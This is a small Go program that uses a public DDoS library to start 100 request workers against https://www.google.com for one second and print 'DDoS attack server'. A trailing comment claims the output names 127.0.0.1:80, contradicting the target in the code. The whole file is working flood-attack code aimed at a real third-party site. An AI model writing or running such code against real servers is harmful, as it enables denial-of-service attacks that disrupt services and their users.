package main

// Library used: https://github.com/Konstantin8105/DDoS

import (
	"fmt"
	"time"

	ddos "github.com/Konstantin8105/DDoS"
)

func main() {
	workers := 100
	server_url := "https://www.google.com"
	d, err := ddos.New(server_url, workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Println("DDoS attack server: " + server_url)
	// Output: DDoS attack server: http://127.0.0.1:80
}
